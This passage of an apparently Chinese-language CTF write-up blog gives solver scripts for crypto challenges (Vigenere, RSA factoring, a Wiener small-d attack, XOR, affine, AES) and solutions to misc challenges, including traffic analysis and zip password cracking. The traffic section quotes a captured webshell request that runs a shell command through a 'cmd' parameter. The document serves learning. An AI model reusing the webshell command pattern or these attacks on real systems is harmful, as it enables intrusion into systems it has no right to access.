class="number">26</span></span><br><span class="line">    <span class="keyword">return</span> alphabet[index_key]</span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">&quot;pqcq&quot;</span></span><br><span class="line">plaintext = <span class="string">&quot;flag&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;&quot;</span>.join([vigenere_decrypt_single(ciphertext[i], plaintext[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)])</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è·‘å‡ºæ¥æ˜¯kfck, çŒœæµ‹æ˜¯kfckfcï¼Œç”¨kfcè§£å¯†åæ‹¿åˆ°flag</p>
<p>flag{la_c1fr4_del_5ign0r_giovan_batt1st4_b3ll5s0}</p>
<h2 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h2><p>Q&amp;A:</p>
<p>1é€‰æ‹©N &#x3D; p * qæ˜¯å› ä¸ºNæœ‰èƒ½å¤Ÿå”¯ä¸€åˆ†è§£æˆp qä¸¤ä¸ªå› å­çš„ç‰¹æ€§</p>
<p>2ä¸ºä»€ä¹ˆÏ†(p) &#x3D;(p-1)ï¼Ÿ</p>
<p>æ˜¯å› ä¸ºpæ˜¯ç´ æ•°è¿™ä¸ªç‰¹æ€§ï¼Œæ‰€ä»¥å’Œpäº’è´¨çš„æ•°æ˜¯p-1ä¸ª</p>
<p>3 edâ‰¡1(mod Ï†(N)) è¿™ä¸ªæ˜¯æ ¹æ®æ‰©æ¬§å‡ é‡Œå¾—æ¨å¯¼å‡ºæ¥çš„</p>
<p>æ‰©æ¬§å‡ é‡Œå¾—çš„å®šä¹‰æ˜¯ èƒ½æ‰¾åˆ°æ•´æ•°x ï¼Œy ä½¿å¾—ax + by &#x3D; gcd(a,b)</p>
<p>eå’Œdæ˜¯äº’è´¨çš„ï¼Œæ‰€ä»¥ä½¿å¾— ex + Ï†(N)y &#x3D; 1 ç„¶åÏ†(N)y &#x3D; 0ï¼Œæ‰€ä»¥å°±ç®—å‡ºedâ‰¡1(mod Ï†(N))  </p>
<p><a target="_blank" rel="noopener" href="http://www.factordb.com/index.php">http://www.factordb.com/index.php</a> å¯ä»¥ç”¨è¿™ä¸ªåœ¨çº¿çš„ç½‘ç«™åˆ†è§£nï¼Œç„¶åæ±‚phi nï¼Œé€šè¿‡phi næ±‚eçš„é€†å…ƒdè§£å¯†</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®—phi n</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_phi_n</span>(<span class="params">factors</span>):</span><br><span class="line">    phi_n = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> factors:</span><br><span class="line">        phi_n *= (p - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> phi_n</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ±‚é€†å…ƒ</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">a, m</span>):</span><br><span class="line">    g, x, y = extended_gcd(a, m)</span><br><span class="line">    <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extended_gcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = extended_gcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_decrypt</span>(<span class="params">c, n, e, factors</span>):</span><br><span class="line">    phi_n = calculate_phi_n(factors)</span><br><span class="line">    d = modinv(e, phi_n)</span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(m).decode()</span><br><span class="line"></span><br><span class="line">n = <span class="number">17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span></span><br><span class="line">factors = [</span><br><span class="line">    <span class="number">2217990919</span>, <span class="number">2338725373</span>, <span class="number">2370292207</span>, <span class="number">2463878387</span>, <span class="number">2706073949</span>,</span><br><span class="line">    <span class="number">2794985117</span>, <span class="number">2804303069</span>, <span class="number">2923072267</span>, <span class="number">2970591037</span>, <span class="number">3207148519</span>,</span><br><span class="line">    <span class="number">3654864131</span>, <span class="number">3831680819</span>, <span class="number">3939901243</span>, <span class="number">4093178561</span>, <span class="number">4278428893</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">decrypted_message = rsa_decrypt(c, n, e, factors)</span><br><span class="line"><span class="built_in">print</span>(decrypted_message)</span><br></pre></td></tr></table></figure>



<h2 id="babyencoding"><a href="#babyencoding" class="headerlink" title="babyencoding"></a>babyencoding</h2><p>part1 å’Œpart2æœ‰&#x3D;å·ï¼Œç„¶åpart1æ˜¯å¤§å°å†™å­—æ¯åŠ æ•°å­—ï¼Œ2æ˜¯çº¯å¤§å†™å­—æ¯ï¼Œåº”è¯¥æ˜¯base64å’Œ32.</p>
<p>part3æœäº†å¥½ä¹…ï¼Œåœ¨è¿™ç¯‡æ–‡ç« ä¸­æ‰¾åˆ°äº†<a target="_blank" rel="noopener" href="https://blog.csdn.net/Retrovich/article/details/90313591">https://blog.csdn.net/Retrovich/article/details/90313591</a> æ˜¯uuencodeç¼–ç ï¼Œåœ¨çº¿è§£å¯†æ‹¼æ¥å¾—åˆ°flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;dazzling_encoding#4e0ad4f0ca08d1e1d0f10c0c7afe422fea7c55192c992036ef623372601ff3a&#125;</span><br></pre></td></tr></table></figure>

<p>åé¢å»çœ‹äº†ä¸€ä¸‹ç¾¤é‡Œçš„cryptoå…¥é—¨çš„æ–‡æ¡£ï¼Œå‘ç°é‡Œé¢å°±æœ‰uuencodeçš„è¯†åˆ«æ–¹æ³•</p>
<h2 id="Small-d"><a href="#Small-d" class="headerlink" title="Small d"></a>Small d</h2><p>Michael J. Wiener è§‰å¾—å¾ˆèµ è¿™ä¸ªæœäº†ä¸€ä¸‹ï¼Œæœ‰ä¸€ç§é’ˆå¯¹small dçš„æ”»å‡»æ–¹å¼å«ç»´çº³æ”»å‡»</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rreally/article/details/111092579">https://blog.csdn.net/rreally/article/details/111092579</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">transform</span>(<span class="params">x, y</span>):  <span class="comment"># ä½¿ç”¨è¾—è½¬ç›¸å¤„å°†åˆ†æ•° x/y è½¬ä¸ºè¿åˆ†æ•°çš„å½¢å¼</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        res.append(x // y)</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">continued_fraction</span>(<span class="params">sub_res</span>):</span><br><span class="line">    numerator, denominator = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> sub_res[::-<span class="number">1</span>]:  <span class="comment"># ä»sublistçš„åé¢å¾€å‰å¾ªç¯</span></span><br><span class="line">        denominator, numerator = numerator, i * numerator + denominator</span><br><span class="line">    <span class="keyword">return</span> denominator, numerator  <span class="comment"># å¾—åˆ°æ¸è¿›åˆ†æ•°çš„åˆ†æ¯å’Œåˆ†å­ï¼Œå¹¶è¿”å›</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ±‚è§£æ¯ä¸ªæ¸è¿›åˆ†æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_fraction</span>(<span class="params">x, y</span>):</span><br><span class="line">    res = transform(x, y)</span><br><span class="line">    res = <span class="built_in">list</span>(<span class="built_in">map</span>(continued_fraction, (res[<span class="number">0</span>:i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(res)))))  <span class="comment"># å°†è¿åˆ†æ•°çš„ç»“æœé€ä¸€æˆªå–ä»¥æ±‚æ¸è¿›åˆ†æ•°</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pq</span>(<span class="params">a, b, c</span>):  <span class="comment"># ç”±p+qå’Œpqçš„å€¼é€šè¿‡ç»´è¾¾å®šç†æ¥æ±‚è§£på’Œq</span></span><br><span class="line">    par = gmpy2.isqrt(b * b - <span class="number">4</span> * a * c)  <span class="comment"># ç”±ä¸Šè¿°å¯å¾—ï¼Œå¼€æ ¹å·ä¸€å®šæ˜¯æ•´æ•°ï¼Œå› ä¸ºæœ‰è§£</span></span><br><span class="line">    x1, x2 = (-b + par) // (<span class="number">2</span> * a), (-b - par) // (<span class="number">2</span> * a)</span><br><span class="line">    <span class="keyword">return</span> x1, x2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wienerAttack</span>(<span class="params">e, n</span>):</span><br><span class="line">    <span class="keyword">for</span> (d, k) <span class="keyword">in</span> sub_fraction(e, n):  <span class="comment"># ç”¨ä¸€ä¸ªforå¾ªç¯æ¥æ³¨æ„è¯•æ¢e/nçš„è¿ç»­å‡½æ•°çš„æ¸è¿›åˆ†æ•°ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„æ¸è¿›åˆ†æ•°</span></span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span>:  <span class="comment"># å¯èƒ½ä¼šå‡ºç°è¿åˆ†æ•°çš„ç¬¬ä¸€ä¸ªä¸º0çš„æƒ…å†µï¼Œæ’é™¤</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (e * d - <span class="number">1</span>) % k != <span class="number">0</span>:  <span class="comment"># ed=1 (mod Ï†(n)) å› æ­¤å¦‚æœæ‰¾åˆ°äº†dçš„è¯ï¼Œ(ed-1)ä¼šæ•´é™¤Ï†(n),ä¹Ÿå°±æ˜¯å­˜åœ¨kä½¿å¾—(e*d-1)//k=Ï†(n)</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        phi = (e * d - <span class="number">1</span>) // k  <span class="comment"># è¿™ä¸ªç»“æœå°±æ˜¯ Ï†(n)</span></span><br><span class="line">        px, qy = get_pq(<span class="number">1</span>, n - phi + <span class="number">1</span>, n)</span><br><span class="line">        <span class="keyword">if</span> px * qy == n:</span><br><span class="line">            p, q = <span class="built_in">abs</span>(<span class="built_in">int</span>(px)), <span class="built_in">abs</span>(<span class="built_in">int</span>(qy))  <span class="comment"># å¯èƒ½ä¼šå¾—åˆ°ä¸¤ä¸ªè´Ÿæ•°ï¼Œè´Ÿè´Ÿå¾—æ­£æœªå°ä¸ä¼šå‡ºç°</span></span><br><span class="line">            d = gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))  <span class="comment"># æ±‚ed=1 (mod  Ï†(n))çš„ç»“æœï¼Œä¹Ÿå°±æ˜¯eå…³äº Ï†(n)çš„ä¹˜æ³•é€†å…ƒd</span></span><br><span class="line">            <span class="keyword">return</span> d</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è¯¥æ–¹æ³•ä¸é€‚ç”¨&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = <span class="number">8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825</span></span><br><span class="line">n = <span class="number">19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433</span></span><br><span class="line">d = wienerAttack(e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;d=&quot;</span>, d)</span><br></pre></td></tr></table></figure>

<p>æ±‚å‡ºdåè§£å¯†flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248</span></span><br><span class="line">e = <span class="number">8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825</span></span><br><span class="line">n = <span class="number">19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433</span></span><br><span class="line">d = <span class="number">2357048593</span></span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br></pre></td></tr></table></figure>





<h2 id="babyxor"><a href="#babyxor" class="headerlink" title="babyxor"></a>babyxor</h2><p>flagæŒ‰å­—èŠ‚å¼‚æˆ–ä¸Šfï¼Œéœ€è¦çˆ†ç ´fï¼Œfçš„èŒƒå›´æ˜¯ä¸€ä¸ªå­—èŠ‚0-255ï¼ŒæŠŠ0-255æŒ‰å­—èŠ‚å¼‚æˆ–ä¸Šcè·‘ä¸€éå°±å¥½äº†</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="string">&quot;e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2&quot;</span></span><br><span class="line">c = <span class="built_in">bytes</span>.fromhex(c)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    flag = <span class="built_in">bytes</span>([b ^ key <span class="keyword">for</span> b <span class="keyword">in</span> c])</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;flag&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>



<h2 id="Affine"><a href="#Affine" class="headerlink" title="Affine"></a>Affine</h2><p>ä»¿å°„å¯†ç ï¼Œè¿™é‡Œè¦æ±‚è§£çš„é—®é¢˜æ˜¯ ç½®å(key[0]*f + key[1]) % modulus è¿™ä¸ªæ“ä½œ</p>
<p>å¯ä»¥ç®€åŒ–æˆm &#x3D; (c -key[1]) * key[0]çš„æ¨¡é€†ï¼Œç”¨æ‰©æ¬§å‡ é‡Œå¾—æ¥æ±‚æ¨¡é€†</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line">c = <span class="string">&quot;dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064&quot;</span></span><br><span class="line">c = <span class="built_in">bytes</span>.fromhex(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ±‚æ¨¡é€†</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">a, m</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, m):</span><br><span class="line">        <span class="keyword">if</span> (a * i) % m == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k0, k1 <span class="keyword">in</span> product(<span class="built_in">range</span>(<span class="number">256</span>), repeat=<span class="number">2</span>):</span><br><span class="line">    k0_inv = modinv(k0, <span class="number">256</span>)</span><br><span class="line">    <span class="keyword">if</span> k0_inv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    decrypted = []</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> c:</span><br><span class="line">        f = ((b - k1) * k0_inv) % <span class="number">256</span></span><br><span class="line">        decrypted.append(f)</span><br><span class="line"></span><br><span class="line">    flag = <span class="built_in">str</span>(<span class="built_in">bytes</span>(decrypted))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>



<h2 id="babyaes"><a href="#babyaes" class="headerlink" title="babyaes"></a>babyaes</h2><p>keyæ˜¯ç”±ä¸¤ä¸ªç›¸åŒçš„é•¿åº¦16å­—èŠ‚çš„å­—ç¬¦ä¸²ç»„æˆï¼Œbytes_to_long(key) ^ bytes_to_long(iv) ^ 1è¿™é‡Œåªå¼‚æˆ–äº†keyçš„16å­—èŠ‚ï¼Œæ‰€ä»¥å¯ä»¥ç®—å‡ºkeyï¼Œç„¶åç”¨keyçš„ä½ä½å¼‚æˆ–å¯ä»¥ç®—å‡ºiv,ç”¨iv å’Œkey ä½¿ç”¨aes cbc modeå°±èƒ½è§£å‡ºflag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">xor = <span class="number">3657491768215750635844958060963805125333761387746954618540958489914964573229</span></span><br><span class="line">flag = <span class="string">b&#x27;&gt;]\xc1\xe5\x82/\x02\x7ft\xf1B\x8d\n\xc1\x95i&#x27;</span></span><br><span class="line">xor = long_to_bytes(xor)</span><br><span class="line">key = xor[:<span class="number">16</span>]*<span class="number">2</span></span><br><span class="line"></span><br><span class="line">iv = bytes_to_long(key[<span class="number">16</span>:]) ^ bytes_to_long(xor[<span class="number">16</span>:])</span><br><span class="line">iv = long_to_bytes(iv)</span><br><span class="line"></span><br><span class="line">aes = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">flag = aes.decrypt(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>



<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="CyberChefâ€™s-Secret"><a href="#CyberChefâ€™s-Secret" class="headerlink" title="CyberChefâ€™s Secret"></a>CyberChefâ€™s Secret</h2><p>base32 -&gt; base58 -&gt;base64</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Base_15_S0_Easy_^_^&#125;</span><br></pre></td></tr></table></figure>



<h2 id="æœºå¯†å›¾ç‰‡"><a href="#æœºå¯†å›¾ç‰‡" class="headerlink" title="æœºå¯†å›¾ç‰‡"></a>æœºå¯†å›¾ç‰‡</h2><p>lsbéšå†™</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;W3lc0m3_t0_N3wSt4RCTF_2023_7cda3ece&#125;</span><br></pre></td></tr></table></figure>



<h2 id="æµé‡ï¼é²¨é±¼ï¼"><a href="#æµé‡ï¼é²¨é±¼ï¼" class="headerlink" title="æµé‡ï¼é²¨é±¼ï¼"></a>æµé‡ï¼é²¨é±¼ï¼</h2><p>çœ‹äº†ä¸€ä¸‹ï¼Œå¾ˆå¤šæ— ç”¨httpçš„æ•°æ®åŒ… ç”¨http.response.code &#x3D;&#x3D; 200ç­›é€‰åï¼Œæ‰¾åˆ°è¿™ä¸ª</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">GET /1.php?cmd=base64%20/.ffffllllllll11111144444GGGGGG|base64 HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cookie: PHPSESSID=85usgbksv9rn85kdcsgu5j0903</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">sec-ch-ua: &quot;Google Chrome&quot;;v=&quot;113&quot;, &quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not=A?Brand&quot;;v=&quot;24&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sat, 19 Aug 2023 06:20:45 GMT</span><br><span class="line">Server: Apache/2.4.51 (Debian)</span><br><span class="line">X-Powered-By: PHP/7.3.33</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Encoding: gzip</span><br><span class="line">Keep-Alive: timeout=5, max=100</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">Wm14aFozdFhjbWt6TldnMGNtdGZNWE5mZFRVelpuVnNYMkkzTW1FMk1EazFNemRsTm4wSwo=</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç„¶åbase64è§£å¯†ä¸¤æ¬¡ï¼Œæ‹¿åˆ°flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Wri35h4rk_1s_u53ful_b72a609537e6&#125;</span><br></pre></td></tr></table></figure>



<h2 id="å‹ç¼©åŒ…ä»¬"><a href="#å‹ç¼©åŒ…ä»¬" class="headerlink" title="å‹ç¼©åŒ…ä»¬"></a>å‹ç¼©åŒ…ä»¬</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hardworking666/p/15866121.html">https://www.cnblogs.com/Hardworking666/p/15866121.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/q20010619/article/details/109425270">https://blog.csdn.net/q20010619/article/details/109425270</a></p>
<p>æœäº†ä¸€ä¸‹ï¼Œç¼ºä¸ªzipå¤´ <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_29566629/article/details/122936177">https://blog.csdn.net/qq_29566629/article/details/122936177</a> </p>
<p>åŠ ä¸Š50 4B 03 04åè§£å‹ï¼Œå‘ç°ç»“å°¾æœ‰ä¸€ä¸²base64ç¼–ç ï¼Œè§£å¯†åæç¤ºå¯†ç æ˜¯6ä½æ•°çš„ï¼Œ</p>
<p>ç”¨ARCHPRç ´è§£æœ‰äº›é—®é¢˜ï¼Œæœäº†ä¸€ä¸‹è£…äº†ä¸€ä¸ªZiperelloï¼Œç ´è§£åæ‹¿åˆ°flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;y0u_ar3_the_m4ter_of_z1111ppp_606a4adc&#125;</span><br></pre></td></tr></table></figure>



